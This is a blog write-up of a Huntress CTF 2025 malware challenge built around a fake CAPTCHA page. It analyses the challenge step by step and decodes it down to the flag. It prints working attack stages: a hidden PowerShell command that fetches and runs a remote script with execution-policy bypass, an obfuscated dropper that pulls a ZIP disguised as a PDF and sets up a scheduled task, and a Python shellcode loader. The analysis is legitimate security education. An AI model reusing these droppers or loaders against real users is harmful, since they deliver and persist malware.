---
title: "Huntress CTF 2025: Verify You Are Human"
date: 2025-10-01
categories: [HuntressCTF2025, malware]
tags: [malware, CTF]
description: "Classic verification 'glitch'"
author: tr4ceang3l
comments: false
published: true
author: ashlynn
---

# The Challenge Deets
- Name: Verify You're Human
- Description:
My computer said I needed to update MS Teams, so that is what I have been trying to do...

...but I can't seem to get past this CAPTCHA!

> CAUTION  
> **This is the `Malware` category.** Please be sure to approach this challenge material within an isolated virtual machine.
{: .prompt-warning }

> NOTE  
> Some components of this challenge may be finicky with the _browser-based_ connection. You can still achieve what you need to, but there may be some more extra steps than if you were to approach this over the VPN.
{: .prompt-info }
	
> 	(_i.e., "remove the port" when you need to... you'll know what I mean_ 😜)
- Category: Malware
- Author: [John Hammond](https://www.youtube.com/@_JohnHammond)

> This challenge is based off real attacks, use ONLY a Virtual Machine and
> DO NOT run this code, you are solely liable for any damages *You* cause 
> by failing to adhere to this warning.
{: .prompt-warning }

## Lets get in! literally!
This year I'll be more technical (still whimsical) with write ups but still expect fun 😜
For the first part of this challenge we're given a fake captcha that *captchas* the essence of common scam methods used by attackers to download malware onto a victim's device. When we boot up the instance and checkout the URL we get this:

![Fake Captcha Website](/assets/img/huntressctf2025/VerifyYouAreHumanSite.png)

Now to some of us, this would raise massive red flags (just like my ex) for it being a scam tactic, for those who have never encountered these kind of phishing attempts, this innocent looking website drops a powershell script right into your clipboard so when you follow the instructions it drops the malware and pwns your system.

Now away from TTPs, ||and back to titties|| i mean CTF....yes...that....
\*clears throat\* Well the specific initial script the site copies into your clipboard is this fun little thing:
```bash
# Script A
"C:\WINDOWS\system32\WindowsPowerShell\v1.0\PowerShell.exe" -Wi HI -nop -c "$UkvqRHtIr=$env:LocalAppData+'\'+(Get-Random -Minimum 5482 -Maximum 86245)+'.PS1';irm 'http://52daaa57.proxy.coursestack.com:443/?tic=1'> $UkvqRHtIr;powershell -Wi HI -ep bypass -f $UkvqRHtIr"
```
What does this do you ask? Well first it boots up a no-profile, window-less powershell terminal to run a fetch from the same initial domain as the verify page to grab this:
```powershell
# Script B
$JGFDGMKNGD = ([char]46)+([char]112)+([char]121)+([char]99);$HMGDSHGSHSHS = [guid]::NewGuid();$OIEOPTRJGS = $env:LocalAppData;irm 'http://52daaa57.proxy.coursestack.com:443/?tic=2' -OutFile $OIEOPTRJGS\$HMGDSHGSHSHS.pdf;Add-Type -AssemblyName System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory("$OIEOPTRJGS\$HMGDSHGSHSHS.pdf", "$OIEOPTRJGS\$HMGDSHGSHSHS");$PIEVSDDGs = Join-Path $OIEOPTRJGS $HMGDSHGSHSHS;$WQRGSGSD = "$HMGDSHGSHSHS";$RSHSRHSRJSJSGSE = "$PIEVSDDGs\pythonw.exe";$RYGSDFSGSH = "$PIEVSDDGs\cpython-3134.pyc";$ENRYERTRYRNTER = New-ScheduledTaskAction -Execute $RSHSRHSRJSJSGSE -Argument "`"$RYGSDFSGSH`"";$TDRBRTRNREN = (Get-Date).AddSeconds(180);$YRBNETMREMY = New-ScheduledTaskTrigger -Once -At $TDRBRTRNREN;$KRYIYRTEMETN = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Limited;Register-ScheduledTask -TaskName $WQRGSGSD -Action $ENRYERTRYRNTER -Trigger $YRBNETMREMY -Principal $KRYIYRTEMETN -Force;Set-Location $PIEVSDDGs;$WMVCNDYGDHJ = "cpython-3134" + $JGFDGMKNGD; Rename-Item -Path "cpython-3134" -NewName $WMVCNDYGDHJ; iex ('rundll32 shell32.dll,ShellExec_RunDLL "' + $PIEVSDDGs + '\pythonw" "' + $PIEVSDDGs + '\'+ $WMVCNDYGDHJ + '"');Remove-Item $MyInvocation.MyCommand.Path -Force;Set-Clipboard
```

Now I'm not expectin' anyone to instantly understand what's going on here so lets break these two scripts down before we move on to the more complex part that comes next!

### Script A -  The Analysis
We can see from the very first line that it's calling out to PowerShell! Great! So now we know what to expect and that's absolutely nothing! Why? because it's just a dropper, we can tell from the domain it fetches with `irm` that it needs another file from `?tic=1` and runs it with a temporary execution bypass *and* windowless again.

### Script B - The Bananalysis
Now as the header here suggests, this part is a little wonky, not because the code is bad but because it's annoying to read, so lets fix that...

```powershell
# --- Step 1: Build the string ".pyc" dynamically ---
$pycExtension = ([char]46) + ([char]112) + ([char]121) + ([char]99)
# Result: ".pyc"

# --- Step 2: Generate a unique identifier (GUID) for folder/file names ---
$uniqueId = [guid]::NewGuid()

# --- Step 3: Define the base folder (LocalAppData) ---
$localAppData = $env:LocalAppData

# --- Step 4: Download the "PDF" file (actually a ZIP archive) ---
$downloadUrl = 'http://52daaa57.proxy.coursestack.com:443/?tic=2'
$downloadedFile = "$localAppData\$uniqueId.pdf"
Invoke-RestMethod -Uri $downloadUrl -OutFile $downloadedFile

# --- Step 5: Extract the ZIP archive ---
Add-Type -AssemblyName System.IO.Compression.FileSystem
$extractFolder = "$localAppData\$uniqueId"
[System.IO.Compression.ZipFile]::ExtractToDirectory($downloadedFile, $extractFolder)

# --- Step 6: Define paths to payload executables ---
$pythonExe = "$extractFolder\pythonw.exe"
$pythonBytecode = "$extractFolder\cpython-3134"

# --- Step 7: Schedule the payload to run after 3 minutes ---
$taskAction = New-ScheduledTaskAction -Execute $pythonExe -Argument "`"$pythonBytecode`""
$taskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(180)
$taskPrincipal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Limited
$taskName = "$uniqueId"
Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Force

# --- Step 8: Rename the Python bytecode file to include ".pyc" ---
$renamedBytecode = "cpython-3134" + $pycExtension
Rename-Item -Path "$extractFolder\cpython-3134" -NewName $renamedBytecode

# --- Step 9: Execute the Python payload immediately (hidden window) ---
$pythonPath = "$extractFolder\pythonw"
Invoke-Expression "rundll32 shell32.dll,ShellExec_RunDLL `"$pythonPath`" `"$extractFolder\$renamedBytecode`""

# --- Step 10: Remove the current script to cover tracks ---
Remove-Item $MyInvocation.MyCommand.Path -Force

# --- Step 11: Clear the clipboard ---
Set-Clipboard
```

By the gods...so much cleaner now! Yes I know there's even steps of execution detailed in my refresher, pretty neat, but now we can actually see what it's doing and we can skip some parts now that we know what's malicious and what's not.
We can see it's downloading something else this time, and if we check that out, it's a ZIP file masquerading as a PDF, which is another technique used by attackers as an attempt to hide what they're doing. Taking a look at what it's doing, there's nothing special except it's running Bytecode...? Something isn't right here...so let's take a look at that so called Totally-Not-A-Malicious-ZIP-And-A-Real-PDF file.

### The PDFile!
So we're going to quickly steal that file by directly grabbing the link and extract those files!
Once we got the ZIP and extracted it we can see everything inside.

![Extracted Contents of the ZIP File](/assets/img/huntressctf2025/VerifyYouAreHumanZIP.png)

From this, we can see a bunch of arbitrary Python details for Portable Python installs, but that's not what is interesting to us, if we take a look at Script B we can see that it's calling `cpython-3134.pyc` which is a compiled python script.
How do we handle Python when it's compiled? Simple, with PyLingual! When we drop the pyc file into the site, we get the following:

```python
import base64

exec(base64.b64decode('aW1wb3J0IGN0eXBlcwoKZGVmIHhvcl9kZWNyeXB0KGNpcGhlcnRleHRfYnl0ZXMsIGtleV9ieXRlcyk6CiAgICBkZWNyeXB0ZWRfYnl0ZXMgPSBieXRlYXJyYXkoKQogICAga2V5X2xlbmd0aCA9IGxlbihrZXlfYnl0ZXMpCiAgICBmb3IgaSwgYnl0ZSBpbiBlbnVtZXJhdGUoY2lwaGVydGV4dF9ieXRlcyk6CiAgICAgICAgZGVjcnlwdGVkX2J5dGUgPSBieXRlIF4ga2V5X2J5dGVzW2kgJSBrZXlfbGVuZ3RoXQogICAgICAgIGRlY3J5cHRlZF9ieXRlcy5hcHBlbmQoZGVjcnlwdGVkX2J5dGUpCiAgICByZXR1cm4gYnl0ZXMoZGVjcnlwdGVkX2J5dGVzKQoKc2hlbGxjb2RlID0gYnl0ZWFycmF5KHhvcl9kZWNyeXB0KGJhc2U2NC5iNjRkZWNvZGUoJ3pHZGdUNkdIUjl1WEo2ODJrZGFtMUE1VGJ2SlAvQXA4N1Y2SnhJQ3pDOXlnZlgyU1VvSUwvVzVjRVAveGVrSlRqRytaR2dIZVZDM2NsZ3o5eDVYNW1nV0xHTmtnYStpaXhCeVRCa2thMHhicVlzMVRmT1Z6azJidURDakFlc2Rpc1U4ODdwOVVSa09MMHJEdmU2cWU3Z2p5YWI0SDI1ZFBqTytkVllrTnVHOHdXUT09JyksIGJhc2U2NC5iNjRkZWNvZGUoJ21lNkZ6azBIUjl1WFR6enVGVkxPUk0yVitacU1iQT09JykpKQpwdHIgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYyhjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSksIGN0eXBlcy5jX2ludCgweDMwMDApLCBjdHlwZXMuY19pbnQoMHg0MCkpCmJ1ZiA9IChjdHlwZXMuY19jaGFyICogbGVuKHNoZWxsY29kZSkpLmZyb21fYnVmZmVyKHNoZWxsY29kZSkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX2ludChwdHIpLCBidWYsIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkpCmZ1bmN0eXBlID0gY3R5cGVzLkNGVU5DVFlQRShjdHlwZXMuY192b2lkX3ApCmZuID0gZnVuY3R5cGUocHRyKQpmbigp').decode('utf-8'))
```

Now of course, we're just going to take that exec right out, cause we aren't silly gooses here, and run the decode to get the following:

```python
import ctypes 

def xor_decrypt(ciphertext_bytes, key_bytes): 
	decrypted_bytes = bytearray() 
	key_length = len(key_bytes) 
	
	for i, byte in enumerate(ciphertext_bytes): 
		decrypted_byte = byte ^ key_bytes[i % key_length]
		decrypted_bytes.append(decrypted_byte) 
		return bytes(decrypted_bytes) 

shellcode = bytearray(xor_decrypt(base64.b64decode('zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2buDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ=='), base64.b64decode('me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA=='))) 

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40)) 
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode) 

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode))) 

functype = ctypes.CFUNCTYPE(ctypes.c_void_p) 
fn = functype(ptr) 
fn()
```

Now that we have the next stage of the malware we can take a better look at *what* it's doing, or will be doing. Firstly, we can see that it's XOR'd shellcode, so I went ahead and just copied that specific piece of code to get:

```python
bytearray(b'U\x89\xe5\x81\xec\x80\x00\x00\x00h\x93\xd8\x84\x84h\x90\xc3\xc6\x97h\xc3\x90\x93\x92h\x90\xc4\xc3\xc7h\x9c\x93\x9c\x93h\xc0\x9c\xc6\xc6h\x97\xc6\x9c\x93h\x94\xc7\x9d\xc1h\xde\xc1\x96\x91h\xc3\xc9\xc4\xc2\xb9\n\x00\x00\x00\x89\xe7\x817\xa5\xa5\xa5\xa5\x83\xc7\x04Iu\xf4\xc6D$&\x00\xc6\x85\x7f\xff\xff\xff\x00\x89\xe6\x8d}\x80\xb9&\x00\x00\x00\x8a\x06\x88\x07FGIu\xf7\xc6\x07\x00\x8d<$\xb9@\x00\x00\x00\xb0\x01\x88\x07GIu\xfa\xc9\xc3')
```

Which is cool, cause this is the shellcode in it's "purest" form, so I decided to hit up Google but not for one of *those* calls 😏but instead a question about analysing the shellcode. This little side quest got me quick answers by finding out about this lovely package: [capstone](https://pypi.org/project/capstone/)
What is Capstone? Well it's a disassembly framework which works great with what we're about to do! Once I got capstone installed, I came up with this little script:

```python
from capstone import *

data = b"The data from the above bytearray()"

md = Cs(CS_ARCH_X86, CS_MODE_32)
for i in md.disasm(data, 0x1000):
    print("0x%x:\t%s\t%s" %(i.address, i.mnemonic, i.op_str))
```

How did I know this was x86 and Little Endian? Well I didn't, not at first at least, that one took a bit of messing around until I got it working after lots of back-and-forth Googling. Turns out 32-bit x86 starts with `0x55 0x89 0xE5` or `push ebp; mov ebp,esp`, another fun fact is that it uses `imm32`, which I'll get to later :D

Now that we have the disassembly of the shellcode, lets take a look at it!

```asm
0x1000: push ebp 
0x1001: mov ebp, esp 
0x1003: sub esp, 0x80 
0x1009: push 0x8484d893 
0x100e: push 0x97c6c390 
0x1013: push 0x929390c3 
0x1018: push 0xc7c3c490 
0x101d: push 0x939c939c 
0x1022: push 0xc6c69cc0 
0x1027: push 0x939cc697 
0x102c: push 0xc19dc794 
0x1031: push 0x9196c1de 
0x1036: push 0xc2c4c9c3 
0x103b: mov ecx, 0xa 
0x1040: mov edi, esp 
0x1042: xor dword ptr [edi], 0xa5a5a5a5 
0x1048: add edi, 4 
0x104b: dec ecx 
0x104c: jne 0x1042 
0x104e: mov byte ptr [esp + 0x26], 0 
0x1053: mov byte ptr [ebp - 0x81], 0 
0x105a: mov esi, esp 
0x105c: lea edi, [ebp - 0x80] 
0x105f: mov ecx, 0x26 
0x1064: mov al, byte ptr [esi] 
0x1066: mov byte ptr [edi], al 
0x1068: inc esi 0x1069: inc edi 
0x106a: dec ecx 
0x106b: jne 0x1064 
0x106d: mov byte ptr [edi], 0 
0x1070: lea edi, [esp] 
0x1073: mov ecx, 0x40 
0x1078: mov al, 1 
0x107a: mov byte ptr [edi], al 
0x107c: inc edi 
0x107d: dec ecx 
0x107e: jne 0x107a 
0x1080: leave 
0x1081: ret
```

If you're like me, most of this will mean absolutely nothing to you, and that's okay, because I cheated a little and used my ASM cheatsheet to figure it out! We can see that the first three lines are our 32 bit indicators, but the interesting part is the stack pushes, which are encrypted with XOR!
Man they really love XOR don't they? Well that's not an issue, we can see the XOR key at `0x1042`. Knowing the key, arch, and endian we can start decrypting again! I came up with another short script to save my lazy ass an extra 5 minutes:

```python
pushes = [
    0x8484d893,0x97c6c390,0x929390c3,0xc7c3c490,
    0x939c939c,0xc6c69cc0,0x939cc697,0xc19dc794,
    0x9196c1de,0xc2c4c9c3
]
KEY = 0xA5A5A5A5

decoded = b''
for d in reversed(pushes):          # reverse order to reconstruct correct string
    val = d ^ KEY
    decoded += val.to_bytes(4, 'little')

print(repr(decoded))
```

Now surely you've notice the `reversed()`, well, that's there because of the aforementioned `imm32`, the command pushes the string or buffer to the stack in reversed order, if we ran this without the `reversed()` we get: `!!}62cf5765fbfa56969cc9e69c2d8b143d{galf` which isn't exactly right, but with the reversed function, we get the correct flag: `flag{d341b8d2c96e9cc96965afbf5675fc26}!!` kinda... it's not the correct flag, at least in format, because the CTF uses the format: `flag\{[0-9a-f]{32}\}` so we need to drop those trailing exclamation marks and...

![Screencapture of the solved challenge and flag](/assets/img/huntressctf2025/VerifyYouAreHumanSolve.png)

Hooray! We solved it! Now go give [John Hammond](https://www.youtube.com/@_JohnHammond) a cheer for yet another fun CTF challenge!
